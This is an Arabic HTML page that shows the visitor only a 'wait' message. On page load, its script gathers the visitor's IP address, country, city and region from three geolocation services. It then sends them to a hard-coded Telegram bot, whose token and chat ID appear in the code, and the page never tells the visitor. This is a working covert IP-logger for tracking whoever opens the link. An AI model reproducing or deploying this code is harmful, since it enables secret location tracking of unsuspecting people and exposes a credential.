<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الموقع</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            direction: rtl;
        }
        #result {
            margin: 20px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            display: inline-block;
        }
    </style>
</head>
<body>
    </h1>انتظر...</h1>
    <div id="result"></div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
        const CHAT_ID = '6913353602';
        
        // دالة الحصول على الموقع الدقيق
        async function getAccurateLocation() {
            try {
                // استخدام ثلاث خدمات مختلفة للتحقق من الدقة
                const [ipapi, ipinfo, geolocation] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(res => res.json()),
                    fetch('https://ipinfo.io/json').then(res => res.json()),
                    fetch('https://geolocation-db.com/json/').then(res => res.json())
                ]);
                
                // تحديد المدينة الأكثر تكراراً بين الخدمات
                const cities = [ipapi.city, ipinfo.city, geolocation.city];
                const cityCount = {};
                cities.forEach(city => {
                    if (city) cityCount[city] = (cityCount[city] || 0) + 1;
                });
                
                const mostCommonCity = Object.keys(cityCount).reduce((a, b) => 
                    cityCount[a] > cityCount[b] ? a : b
                );
                
                return {
                    ip: ipapi.ip || ipinfo.ip || geolocation.IPv4,
                    country: ipapi.country_name || ipinfo.country || geolocation.country_name,
                    city: mostCommonCity,
                    region: ipapi.region || ipinfo.region || geolocation.state
                };
                
            } catch (error) {
                console.error('Error:', error);
                return {
                    ip: 'غير معروف',
                    country: 'غير معروف',
                    city: 'غير معروف',
                    region: 'غير معروف'
                };
            }
        }
        
        // دالة الإرسال إلى التليجرام
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error sending:', error);
            }
        }
        
        // عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', async () => {
            const { ip, country, city, region } = await getAccurateLocation();
            
            // عرض النتيجة للمستخدم
            
            
            // إرسال البيانات إلى البوت
            const message = `
                📌 <b>معلومات الموقع الجديدة:</b>
                ━━━━━━━━━━━━━━━━━
                • <b>IP:</b> <code>${ip}</code>
                • <b>البلد:</b> ${country}
                • <b>المدينة:</b> ${city}
                • <b>المنطقة:</b> ${region}
                ━━━━━━━━━━━━━━━━━
                ⏰ <i>${new Date().toLocaleString('ar-SA')}</i>
            `;
            
            await sendToTelegram(message);
            
            // إخفاء النتيجة بعد 5 ثواني
            setTimeout(() => {
                document.getElementById('result').style.display = 'none';
                document.querySelector('h1').textContent = 'انتظر 5 ثواني...';
            }, 5000);
        });
    </script>
</body>
</html>
